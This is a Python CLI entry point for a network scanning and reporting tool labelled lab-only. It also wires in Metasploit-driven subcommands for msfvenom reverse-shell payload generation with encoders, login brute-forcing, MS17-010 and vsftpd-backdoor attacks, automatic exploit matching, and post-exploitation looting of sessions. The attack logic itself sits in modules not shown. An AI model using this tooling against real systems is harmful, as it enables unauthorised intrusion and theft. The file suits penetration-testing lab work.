from __future__ import annotations

import argparse
import asyncio
import json
import sys
from datetime import datetime, timezone
from pathlib import Path

from .config import ConfigError, load_config
from .exploit_matcher import ExploitMatcher
from .inference import infer_findings, load_rules
from .inventory import build_inventory, write_inventory
from .logging_setup import configure_logging
from .loot import AutoLoot
from .metasploit import MetasploitIntegration
from .nmap_scanner import NmapScanner
from .payload import generate_payload
from .report import (
    build_report,
    severity_rank,
    summarize_findings,
    write_findings_csv,
    write_report,
    write_summary_csv,
    write_text_report,
)
from .scanner import expand_targets, scan_targets
from .targeted_attacks import TargetedAttacker
from .web import start_web_server


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(
        description="Lab-only network inventory and risk inference tool."
    )
    parser.add_argument(
        "--config",
        default="config.toml",
        help="Path to TOML config file (default: config.toml)",
    )
    parser.add_argument(
        "-v",
        "--verbose",
        action="count",
        default=0,
        help="Increase verbosity (repeat for more detail).",
    )
    parser.add_argument(
        "--dry-run",
        action="store_true",
        help="Show the scan plan without scanning or writing reports.",
    )
    parser.add_argument(
        "--min-severity",
        choices=["info", "low", "medium", "high", "critical"],
        help="Only include findings at or above this severity.",
    )
    parser.add_argument(
        "--service",
        action="append",
        default=[],
        help="Filter findings by service (repeatable).",
    )
    parser.add_argument(
        "--port",
        action="append",
        type=int,
        default=[],
        help="Filter findings by port (repeatable).",
    )
    parser.add_argument(
        "--output-dir",
        help="Override the output directory.",
    )
    parser.add_argument(
        "--output-prefix",
        help="Prefix output filenames (e.g., lab1_report.json).",
    )
    parser.add_argument(
        "--no-timestamp",
        action="store_true",
        help="Disable timestamped output filenames.",
    )
    subparsers = parser.add_subparsers(dest="command", required=True)
    subparsers.add_parser("plan", help="Print the resolved targets and ports.")
    subparsers.add_parser("run", help="Run scan and generate inventory/report.")
    subparsers.add_parser("web", help="Start the web dashboard.")
    
    payload_parser = subparsers.add_parser("payload", help="Generate a payload using msfvenom.")
    payload_parser.add_argument("-p", "--payload", required=True, help="Payload to generate (e.g., windows/meterpreter/reverse_tcp)")
    payload_parser.add_argument("--lhost", required=True, help="Listen address (LHOST)")
    payload_parser.add_argument("--lport", required=True, type=int, help="Listen port (LPORT)")
    payload_parser.add_argument("-f", "--format", required=True, help="Output format (e.g., exe, elf, raw)")
    payload_parser.add_argument("-o", "--output", required=True, help="Output file path")
    payload_parser.add_argument("--platform", help="Target platform")
    payload_parser.add_argument("-a", "--arch", help="Target architecture")
    payload_parser.add_argument("-b", "--bad-chars", help="Bad characters to avoid (e.g., '\\x00\\xff')")
    payload_parser.add_argument("-e", "--encoder", help="Encoder to use")
    payload_parser.add_argument("-i", "--iterations", type=int, default=0, help="Number of encoding iterations")

    brute_parser = subparsers.add_parser("bruteforce", help="Run brute force on a target service.")
    brute_parser.add_argument("--service", required=True, choices=["ssh", "ftp", "smb", "http"], help="Service to attack")
    brute_parser.add_argument("--rhosts", required=True, help="Target hosts (RHOSTS)")
    brute_parser.add_argument("--user-file", required=True, help="Path to username file")
    brute_parser.add_argument("--pass-file", required=True, help="Path to password file")

    subparsers.add_parser("sessions", help="List active Metasploit sessions.")
    subparsers.add_parser("loot", help="Run post-exploitation loot on all active sessions.")
    
    attack_parser = subparsers.add_parser("attack", help="Run a targeted attack.")
    attack_parser.add_argument("--type", required=True, choices=["ms17-010", "vsftpd"], help="Type of attack")
    attack_parser.add_argument("--target", required=True, help="Target IP address")

    args = parser.parse_args(argv)
    configure_logging(args.verbose)

    if args.command == "payload":
        success = generate_payload(
            payload=args.payload,
            lhost=args.lhost,
            lport=args.lport,
            format=args.format,
            output_file=Path(args.output),
            platform=args.platform,
            arch=args.arch,
            bad_chars=args.bad_chars,
            encoder=args.encoder,
            iterations=args.iterations,
        )
        return 0 if success else 1

    try:
        config = load_config(Path(args.config))
        targets = expand_targets(config.targets, config.scan.resolve_dns)
    except ConfigError as exc:
        print(f"Config error: {exc}", file=sys.stderr)
        return 2

    if args.command == "web":
        start_web_server(config)
        return 0

    if args.command == "sessions":
        msf = MetasploitIntegration(config.metasploit)
        if msf.connect():
            sessions = msf.list_sessions()
            print(json.dumps(sessions, indent=2))
        return 0

    if args.command == "bruteforce":
        msf = MetasploitIntegration(config.metasploit)
        if msf.connect():
            result = msf.run_bruteforce(
                service=args.service,
                rhosts=args.rhosts,
                user_file=args.user_file,
                pass_file=args.pass_file
            )
            print(json.dumps(result, indent=2))
        return 0

    if args.command == "attack":
        msf = MetasploitIntegration(config.metasploit)
        if msf.connect():
            attacker = TargetedAttacker(msf)
            if args.type == "ms17-010":
                result = attacker.attack_ms17_010(args.target)
            elif args.type == "vsftpd":
                result = attacker.attack_vsftpd_backdoor(args.target)
            print(json.dumps(result, indent=2))
        return 0

    if args.command == "loot":
        msf = MetasploitIntegration(config.metasploit)
        if msf.connect():
            looter = AutoLoot(msf, config.output.directory)
            results = looter.loot_all_sessions()
            print(json.dumps(results, indent=2))
        return 0

    plan = {
        "targets": [{"host": target.host, "ip": target.ip} for target in targets],
        "ports": config.scan.ports,
        "timeout_seconds": config.scan.timeout_seconds,
        "concurrency": config.scan.concurrency,
        "metasploit_enabled": config.metasploit.enabled,
        "nmap_enabled": config.nmap.enabled,
    }

    if args.command == "plan" or args.dry_run:
        print(json.dumps(plan, indent=2, ensure_ascii=True))
        return 0

    try:
        scans = asyncio.run(scan_targets(targets, config.scan))
    except KeyboardInterrupt:
        return 130

    # Nmap Integration & Auto-Exploit Matching
    if config.nmap.enabled:
        nmap_scanner = NmapScanner(arguments=config.nmap.arguments, sudo=config.nmap.sudo)
        if nmap_scanner.is_available():
            hosts_to_scan = []
            ports_to_scan = set()
            for scan in scans:
                if scan.open_ports:
                    hosts_to_scan.append(scan.target.ip)
                    for p in scan.open_ports:
                        ports_to_scan.add(p.port)
            
            if hosts_to_scan:
                nmap_results = nmap_scanner.scan(hosts_to_scan, list(ports_to_scan))
                print(f"Nmap scan completed. Results available for {len(nmap_results)} hosts.")
                
                # Auto-Exploit Matching
                matcher = ExploitMatcher(Path("data/exploit_db.json"))
                for host, data in nmap_results.items():
                    potential_exploits = matcher.find_exploits_for_host(data)
                    if potential_exploits:
                        print(f"\n[!] Potential Exploits for {host}:")
                        for exploit in potential_exploits:
                            print(f"    - {exploit['service']} {exploit['version']} -> {exploit['module']} (Rank: {exploit['rank']})")

    inventory = build_inventory(scans)

    rules_path = config.inference.rules_file
    if not rules_path.exists():
        print(f"Rules file not found: {rules_path}", file=sys.stderr)
        return 2
    rules = load_rules(rules_path)
    findings = infer_findings(scans, rules)

    filtered_findings = _filter_findings(
        findings,
        min_severity=args.min_severity,
        services=args.service,
        ports=args.port,
    )

    # Metasploit Integration
    if config.metasploit.enabled:
        msf = MetasploitIntegration(config.metasploit)
        if msf.connect():
            exploits = msf.list_modules("exploit")
            print(f"Connected to Metasploit. Found {len(exploits)} available exploits.")

    report = build_report(inventory, filtered_findings)

    output_dir = Path(args.output_dir) if args.output_dir else config.output.directory
    timestamped = config.output.timestamped and not args.no_timestamp
    inventory_path = _timestamped_path(
        _apply_prefix(output_dir / config.output.inventory_file, args.output_prefix),
        timestamped,
    )
    report_path = _timestamped_path(
        _apply_prefix(output_dir / config.output.report_file, args.output_prefix),
        timestamped,
    )
    report_text_path = _timestamped_path(
        _apply_prefix(output_dir / config.output.report_text_file, args.output_prefix),
        timestamped,
    )
    report_csv_path = _timestamped_path(
        _apply_prefix(output_dir / config.output.report_csv_file, args.output_prefix),
        timestamped,
    )
    summary_csv_path = _timestamped_path(
        _apply_prefix(output_dir / config.output.summary_csv_file, args.output_prefix),
        timestamped,
    )
    write_inventory(inventory, inventory_path)
    write_report(report, report_path)
    write_text_report(report, report_text_path)
    write_findings_csv(report.get("findings", []), report_csv_path)
    write_summary_csv(report, summary_csv_path)

    print(f"Inventory written to: {inventory_path}")
    print(f"Report written to: {report_path}")
    print(f"Text report written to: {report_text_path}")
    print(f"Findings CSV written to: {report_csv_path}")
    print(f"Summary CSV written to: {summary_csv_path}")
    _print_summary(report, filters_applied=_filters_applied(args))
    return 0


def _timestamped_path(path: Path, timestamped: bool) -> Path:
    if not timestamped:
        return path
    timestamp = datetime.now(timezone.utc).strftime("%Y%m%dT%H%M%SZ")
    return path.with_name(f"{path.stem}_{timestamp}{path.suffix}")


def _apply_prefix(path: Path, prefix: str | None) -> Path:
    if not prefix:
        return path
    return path.with_name(f"{prefix}_{path.name}")


def _filter_findings(
    findings: list[dict],
    min_severity: str | None,
    services: list[str],
    ports: list[int],
) -> list[dict]:
    service_filter = {service.lower() for service in services} if services else set()
    port_filter = {int(port) for port in ports} if ports else set()
    min_rank = severity_rank(min_severity) if min_severity else None
    filtered: list[dict] = []
    for finding in findings:
        target = finding.get("target", {})
        severity = str(finding.get("severity", "unknown"))
        if min_rank is not None and severity_rank(severity) < min_rank:
            continue
        if service_filter:
            service = str(target.get("service", "")).lower()
            if service not in service_filter:
                continue
        if port_filter:
            try:
                port = int(target.get("port", 0))
            except (TypeError, ValueError):
                continue
            if port not in port_filter:
                continue
        filtered.append(finding)
    return filtered


def _print_summary(report: dict, filters_applied: bool) -> None:
    summary = report.get("summary", {})
    severity_counts = summarize_findings(report.get("findings", []))
    print("Summary")
    print(f"Targets: {summary.get('targets', 0)}")
    print(f"Open ports: {summary.get('open_ports', 0)}")
    print(f"Findings: {summary.get('findings', 0)}")
    print(
        "Findings by severity: "
        f"critical {severity_counts.get('critical', 0)}, "
        f"high {severity_counts.get('high', 0)}, "
        f"medium {severity_counts.get('medium', 0)}, "
        f"low {severity_counts.get('low', 0)}, "
        f"info {severity_counts.get('info', 0)}, "
        f"unknown {severity_counts.get('unknown', 0)}"
    )
    if filters_applied:
        print("Note: Findings have been filtered by CLI options.")


def _filters_applied(args: argparse.Namespace) -> bool:
    return bool(args.min_severity or args.service or args.port)


if __name__ == "__main__":
    raise SystemExit(main())
